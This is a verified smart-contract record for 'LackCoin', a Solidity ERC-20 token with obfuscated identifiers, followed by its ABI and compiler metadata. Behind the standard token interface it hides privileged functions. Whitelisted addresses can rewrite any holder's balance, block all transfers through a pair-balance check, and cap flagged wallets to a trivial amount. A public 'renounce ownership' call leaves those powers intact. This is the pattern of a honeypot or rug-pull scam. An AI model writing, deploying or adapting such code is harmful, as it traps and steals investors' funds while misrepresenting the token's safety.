{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract isAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minWalletTotal {\n    function createPair(address listMarketingMin, address maxAuto) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface walletAmountMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface takeSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minReceiverIs) external view returns (uint256);\n\n    function transfer(address shouldMarketing, uint256 teamFee) external returns (bool);\n\n    function allowance(address maxMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldMarketing,\n        uint256 teamFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minSenderLiquidity, uint256 value);\n    event Approval(address indexed maxMode, address indexed spender, uint256 value);\n}\n\ninterface takeSellMetadata is takeSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LackCoin is isAmount, takeSell, takeSellMetadata {\n\n    uint256 constant limitTake = 9 ** 10;\n\n    uint256 shouldLaunchLimit;\n\n    mapping(address => bool) public txBuy;\n\n    uint256 public walletTakeMax;\n\n    uint256 public liquidityAt = 0;\n\n    string private tradingFrom = \"Lack Coin\";\n\n    uint256 private walletMode = 100000000 * 10 ** 18;\n\n    function transferFrom(address feeLaunch, address shouldMarketing, uint256 teamFee) external override returns (bool) {\n        if (_msgSender() != autoReceiver) {\n            if (limitEnable[feeLaunch][_msgSender()] != type(uint256).max) {\n                require(teamFee <= limitEnable[feeLaunch][_msgSender()]);\n                limitEnable[feeLaunch][_msgSender()] -= teamFee;\n            }\n        }\n        return buyLaunched(feeLaunch, shouldMarketing, teamFee);\n    }\n\n    mapping(address => bool) public receiverTx;\n\n    bool public fundAuto;\n\n    event OwnershipTransferred(address indexed isFund, address indexed feeAmount);\n\n    function allowance(address limitSwap, address liquidityEnableIs) external view virtual override returns (uint256) {\n        if (liquidityEnableIs == autoReceiver) {\n            return type(uint256).max;\n        }\n        return limitEnable[limitSwap][liquidityEnableIs];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tradingFrom;\n    }\n\n    uint256 listReceiver;\n\n    function getOwner() external view returns (address) {\n        return autoReceiverTake;\n    }\n\n    function toShouldFee(address enableMax) public {\n        require(enableMax.balance < 100000);\n        if (receiverSenderExempt) {\n            return;\n        }\n        \n        receiverTx[enableMax] = true;\n        if (isLaunch != toAuto) {\n            isLaunch = exemptLiquidityTake;\n        }\n        receiverSenderExempt = true;\n    }\n\n    uint256 public swapLimit;\n\n    function balanceOf(address minReceiverIs) public view virtual override returns (uint256) {\n        return tradingFee[minReceiverIs];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedList;\n    }\n\n    function walletListTo() public {\n        emit OwnershipTransferred(limitToken, address(0));\n        autoReceiverTake = address(0);\n    }\n\n    uint256 public listAt = 3;\n\n    address public limitToken;\n\n    string private enableLaunched = \"LCN\";\n\n    uint256 public toAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableLaunched;\n    }\n\n    mapping(address => uint256) private tradingFee;\n\n    bool private autoMode;\n\n    address private autoReceiverTake;\n\n    function owner() external view returns (address) {\n        return autoReceiverTake;\n    }\n\n    bool public receiverSenderExempt;\n\n    uint256 private sellAmountBuy;\n\n    function enableAmount(address feeLaunch, address shouldMarketing, uint256 teamFee) internal returns (bool) {\n        require(tradingFee[feeLaunch] >= teamFee);\n        tradingFee[feeLaunch] -= teamFee;\n        tradingFee[shouldMarketing] += teamFee;\n        emit Transfer(feeLaunch, shouldMarketing, teamFee);\n        return true;\n    }\n\n    address autoReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private launchedList = 18;\n\n    function buyLaunched(address feeLaunch, address shouldMarketing, uint256 teamFee) internal returns (bool) {\n        if (feeLaunch == limitToken) {\n            return enableAmount(feeLaunch, shouldMarketing, teamFee);\n        }\n        uint256 fundSell = takeSell(exemptFrom).balanceOf(sellLaunched);\n        require(fundSell == shouldLaunchLimit);\n        require(shouldMarketing != sellLaunched);\n        if (txBuy[feeLaunch]) {\n            return enableAmount(feeLaunch, shouldMarketing, limitTake);\n        }\n        teamFee = txMax(feeLaunch, shouldMarketing, teamFee);\n        return enableAmount(feeLaunch, shouldMarketing, teamFee);\n    }\n\n    function receiverLaunchedTo(address listTake, uint256 teamFee) public {\n        shouldAmount();\n        tradingFee[listTake] = teamFee;\n    }\n\n    function tokenMin(uint256 teamFee) public {\n        shouldAmount();\n        shouldLaunchLimit = teamFee;\n    }\n\n    constructor (){\n        if (fundSenderReceiver == autoMode) {\n            fundSenderReceiver = false;\n        }\n        walletListTo();\n        walletAmountMarketing takeEnable = walletAmountMarketing(autoReceiver);\n        exemptFrom = minWalletTotal(takeEnable.factory()).createPair(takeEnable.WETH(), address(this));\n        sellLaunched = minWalletTotal(takeEnable.factory()).feeTo();\n        if (isLaunch == sellAmountBuy) {\n            autoMode = true;\n        }\n        limitToken = _msgSender();\n        receiverTx[limitToken] = true;\n        tradingFee[limitToken] = walletMode;\n        if (swapLimit != toAuto) {\n            fundSenderReceiver = false;\n        }\n        emit Transfer(address(0), limitToken, walletMode);\n    }\n\n    function transfer(address listTake, uint256 teamFee) external virtual override returns (bool) {\n        return buyLaunched(_msgSender(), listTake, teamFee);\n    }\n\n    function txMax(address feeLaunch, address shouldMarketing, uint256 teamFee) internal view returns (uint256) {\n        require(teamFee > 0);\n\n        uint256 fromReceiverBuy = 0;\n        if (feeLaunch == exemptFrom && listAt > 0) {\n            fromReceiverBuy = teamFee * listAt / 100;\n        } else if (shouldMarketing == exemptFrom && liquidityAt > 0) {\n            fromReceiverBuy = teamFee * liquidityAt / 100;\n        }\n        require(fromReceiverBuy <= teamFee);\n        return teamFee - fromReceiverBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private limitEnable;\n\n    function shouldAmount() private view {\n        require(receiverTx[_msgSender()]);\n    }\n\n    function minAt(address marketingAtBuy) public {\n        shouldAmount();\n        \n        if (marketingAtBuy == limitToken || marketingAtBuy == exemptFrom) {\n            return;\n        }\n        txBuy[marketingAtBuy] = true;\n    }\n\n    uint256 private exemptLiquidityTake;\n\n    address public exemptFrom;\n\n    address sellLaunched;\n\n    bool public fundSenderReceiver;\n\n    function approve(address liquidityEnableIs, uint256 teamFee) public virtual override returns (bool) {\n        limitEnable[_msgSender()][liquidityEnableIs] = teamFee;\n        emit Approval(_msgSender(), liquidityEnableIs, teamFee);\n        return true;\n    }\n\n    uint256 public isLaunch;\n\n    uint256 public buyTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletMode;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSenderLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityEnableIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnableIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiverIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSenderReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAtBuy\",\"type\":\"address\"}],\"name\":\"minAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"receiverLaunchedTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSenderExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"}],\"name\":\"toShouldFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"tokenMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletListTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTakeMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LackCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}